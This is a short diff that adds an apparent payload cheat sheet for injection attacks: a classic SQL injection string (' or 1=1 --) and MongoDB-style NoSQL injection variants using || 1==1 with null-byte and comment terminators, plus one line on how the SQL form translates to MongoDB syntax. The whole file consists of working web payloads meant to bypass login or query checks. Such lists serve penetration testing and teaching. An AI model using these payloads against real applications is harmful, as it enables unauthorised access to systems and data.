@@ -1,0 +1,10 @@
+ ' or 1=1 --
+ 
+ First, by reading MongoDB documentation you can find that the SQL or 1=1 translates to || 1==1 (note the double =). 
+ 
+ a' || 1==1 %00
+ 
+ OR
+ 
+ a' || 1==1 [// or <!-- ]
+ 
